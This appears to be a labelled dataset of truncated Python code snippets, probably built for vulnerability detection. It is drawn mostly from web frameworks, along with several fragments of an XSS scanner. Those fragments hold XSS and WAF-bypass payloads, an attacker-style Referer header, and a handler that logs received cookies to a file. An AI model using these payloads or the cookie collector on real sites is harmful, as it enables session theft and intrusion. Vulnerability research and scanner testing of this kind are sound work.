\"all\", \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003", "label": 0}, {"snippet_id": 46551, "code": ".GET.get('is_embeddable', False), 'existing_hue_collections': existing_hue_collections, 'is_redirect': is_redirect }) def admin_collection_delete(request): if request.method !='POST': raise PopupException", "label": 0}, {"snippet_id": 21964, "code": " ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION')", "label": 0}, {"snippet_id": 21217, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name", "label": 0}, {"snippet_id": 3842, "code": ".update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers)", "label": 0}, {"snippet_id": 33274, "code": " \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\" @decorators.require_cronjob def get(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi", "label": 0}, {"snippet_id": 6277, "code": "\"\" Set to True to log debug messages(boolean). \"\"\" return self.config.getboolean(self.section, 'debug') @property def syslog_debug(self): \"\"\" Set to True to log debug messages to syslog(also requires syslog_socket", "label": 0}, {"snippet_id": 4998, "code": "(confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml", "label": 0}, {"snippet_id": 321, "code": " impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query", "label": 0}, {"snippet_id": 23461, "code": "/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider", "label": 0}, {"snippet_id": 18671, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 49465, "code": ".get_title() def get_values(self): values=[] if isinstance(self.model_field, SmartListFilter): values=[ SmartFilterValue(self.model_field.parameter_name, choice[1], choice[0], self.query_params) for choice", "label": 0}, {"snippet_id": 37704, "code": " count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments", "label": 0}, {"snippet_id": 24492, "code": "=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p(", "label": 0}, {"snippet_id": 45174, "code": ".content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'],", "label": 0}, {"snippet_id": 40885, "code": "\t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: ", "label": 0}, {"snippet_id": 5330, "code": ", 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script'", "label": 0}, {"snippet_id": 43449, "code": "(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 52491, "code": "{ 'name': workflow.name, 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2", "label": 0}, {"snippet_id": 41276, "code": "(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route", "label": 0}, {"snippet_id": 18994, "code": "'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status", "label": 0}, {"snippet_id": 53625, "code": " enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt, properties", "label": 0}, {"snippet_id": 9, "code": " as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list", "label": 0}, {"snippet_id": 17985, "code": "==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render", "label": 0}, {"snippet_id": 33215, "code": ": self.response.write(ex.message) self.abort(400) build=model.Build.get_by_id(build_id) can_view=build and user.can_view_build_async(build).get_result() if not can_view: if auth.get_current_identity().is_anonymous", "label": 1}, {"snippet_id": 31479, "code": ".padding=5 \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid", "label": 0}, {"snippet_id": 40873, "code": "\treturn out \t \tif filters: \t\tfor f in filters: \t\t\tfval=filters[f] \t\t\tif not isinstance(fval,(tuple, list)): \t\t\t\tif fval is True: \t\t\t\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval)", "label": 0}, {"snippet_id": 26930, "code": ")==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else", "label": 0}, {"snippet_id": 45550, "code": "'bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name", "label": 0}, {"snippet_id": 4880, "code": "<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss", "label": 1}, {"snippet_id": 38176, "code": ".update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category`", "label": 0}, {"snippet_id": 37258, "code": "+self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 3871, "code": "\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload", "label": 0}, {"snippet_id": 11366, "code": "(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course", "label": 0}, {"snippet_id": 26317, "code": " VAT ID is not valid. Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance", "label": 0}, {"snippet_id": 24274, "code": " pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY", "label": 0}, {"snippet_id": 48599, "code": " sr.primary_reservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) sr.save() print(request.POST) print(sr.notes) return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request", "label": 0}, {"snippet_id": 12628, "code": " +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 27296, "code": ".replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url) os.remove(\"tmpage.txt\") except Exception, e: print \"[-] Main(): Error \" +str(e) print \"[*] Done\"", "label": 1}, {"snippet_id": 21762, "code": "<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 52957, "code": "() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request", "label": 0}, {"snippet_id": 43605, "code": " self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname", "label": 0}, {"snippet_id": 4241, "code": " result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid", "label": 0}, {"snippet_id": 50381, "code": "=(time.time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid) if sess: sess=sess[0] cmdarray=json.loads(request.args.get('data')[0]) sess.sessionhandler.data_in(sess, **{cmdarray[0]:[cmdarray", "label": 1}, {"snippet_id": 33005, "code": "/plain', status_code=200): self.send_response(status_code) self.send_header('Content-Type', content_type) self.end_headers() def _WriteTemplate(self, template): contents=self._Read(os.path.join('tools', ", "label": 0}, {"snippet_id": 16859, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P", "label": 0}, {"snippet_id": 40278, "code": " value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text", "label": 0}, {"snippet_id": 3102, "code": ".find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii','ignore", "label": 0}, {"snippet_id": 43849, "code": " display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest", "label": 0}, {"snippet_id": 40506, "code": "][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent", "label": 0}, {"snippet_id": 17735, "code": ", 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib", "label": 0}, {"snippet_id": 41937, "code": "(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass',", "label": 0}, {"snippet_id": 22710, "code": ".change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 9589, "code": "/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ", "label": 0}, {"snippet_id": 9110, "code": "'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 51315, "code": " def save_model(self, request, obj, form, change): if 'internet_nl_api_password' in form.changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode())", "label": 0}, {"snippet_id": 23428, "code": "'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=(", "label": 0}, {"snippet_id": 26301, "code": " normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError, ValueError): raise ValidationError(_('This VAT ID is not valid", "label": 0}, {"snippet_id": 4587, "code": ", 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd',", "label": 0}, {"snippet_id": 30467, "code": "%s %s %s\" %(local_path_logs, date, date1, rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act,", "label": 0}, {"snippet_id": 43936, "code": ",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val", "label": 0}, {"snippet_id": 16604, "code": "'change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"", "label": 0}, {"snippet_id": 4174, "code": ") xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact", "label": 0}, {"snippet_id": 3809, "code": " \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True", "label": 0}, {"snippet_id": 28650, "code": "('uuid') \tref=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid is not None: \t\tsql.update_last_act_user(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint", "label": 0}, {"snippet_id": 19438, "code": " test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp", "label": 0}, {"snippet_id": 4187, "code": " print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable", "label": 0}, {"snippet_id": 34669, "code": "[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance", "label": 0}, {"snippet_id": 38178, "code": " Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 ", "label": 0}, {"snippet_id": 1457, "code": " import sys import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan", "label": 1}, {"snippet_id": 41403, "code": ".escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t", "label": 0}, {"snippet_id": 8721, "code": "/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 1019, "code": "): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse", "label": 1}, {"snippet_id": 11393, "code": " print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf", "label": 0}, {"snippet_id": 17868, "code": "'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': ", "label": 0}, {"snippet_id": 53995, "code": "\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n------------------------", "label": 0}, {"snippet_id": 3467, "code": "-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert", "label": 0}, {"snippet_id": 50980, "code": " MyPeriodicTaskForm(PeriodicTaskForm): fieldsets=PeriodicTaskAdmin.fieldsets \"\"\" Interval schedule does not support due_ or something. Which is absolutely terrible and vague. I can't understand why there", "label": 0}, {"snippet_id": 25472, "code": "=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields=require_all_fields self.required", "label": 0}, {"snippet_id": 24321, "code": " related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only", "label": 0}, {"snippet_id": 27100, "code": " scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname, \"r\") as f: for line in f: if line.find(\"</form>\") >=0: has_form=0 if len(page) >", "label": 1}, {"snippet_id": 29943, "code": "\t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div", "label": 0}, {"snippet_id": 3570, "code": ".logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid", "label": 0}, {"snippet_id": 3293, "code": ".headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer", "label": 1}, {"snippet_id": 18740, "code": "=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', ", "label": 0}, {"snippet_id": 39220, "code": "(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in", "label": 0}, {"snippet_id": 14244, "code": "+=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url", "label": 0}, {"snippet_id": 12948, "code": " urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ", "label": 0}, {"snippet_id": 13430, "code": " continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template'", "label": 0}, {"snippet_id": 43834, "code": " original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self", "label": 0}, {"snippet_id": 23189, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/", "label": 0}, {"snippet_id": 28903, "code": "\treturn str(error) def get_config(serv, cfg, **kwargs): \timport sql \tconfig_path=\"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t \tssh=ssh_connect", "label": 0}, {"snippet_id": 3547, "code": " xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact", "label": 0}, {"snippet_id": 452, "code": " xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload", "label": 1}, {"snippet_id": 49102, "code": " for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): return True return False def get_add_sort_by(self): if not self.is_ordered(): if", "label": 0}, {"snippet_id": 49199, "code": ".replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query", "label": 0}, {"snippet_id": 30031, "code": ", \"w\") as ssl_cert: \t\t\tssl_cert.write(form.getvalue('ssl_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>') \telse: \t\tprint", "label": 0}, {"snippet_id": 27407, "code": ".FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return '{t.day}{t:%b}{t:%y}{t:%X} PDT'.format(t=dt) def", "label": 0}, {"snippet_id": 43170, "code": ": \t\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): ", "label": 0}, {"snippet_id": 42883, "code": "'fetch_if_empty') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name',", "label": 0}, {"snippet_id": 26407, "code": " support to ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs)", "label": 0}, {"snippet_id": 4237, "code": "(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print", "label": 0}, {"snippet_id": 42165, "code": "\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t", "label": 0}, {"snippet_id": 15845, "code": ".get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course", "label": 0}, {"snippet_id": 37646, "code": "=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content", "label": 0}, {"snippet_id": 44311, "code": "(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e", "label": 0}, {"snippet_id": 50370, "code": " Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid) if sess: sess=sess[0] cmdarray=json.loads", "label": 1}, {"snippet_id": 4663, "code": "'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete'", "label": 0}, {"snippet_id": 38708, "code": "=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]", "label": 0}, {"snippet_id": 11033, "code": ") self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from", "label": 0}, {"snippet_id": 39382, "code": ".DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False", "label": 0}, {"snippet_id": 42605, "code": " be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) ", "label": 0}, {"snippet_id": 24927, "code": "(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self", "label": 0}, {"snippet_id": 40449, "code": "(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif", "label": 0}, {"snippet_id": 38055, "code": "\"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog", "label": 0}, {"snippet_id": 48206, "code": " action_add_multiple_media(request: HttpRequest): try: category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file(user", "label": 0}, {"snippet_id": 35731, "code": "\t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None", "label": 0}, {"snippet_id": 45320, "code": "=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_(", "label": 0}, {"snippet_id": 9125, "code": ", 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 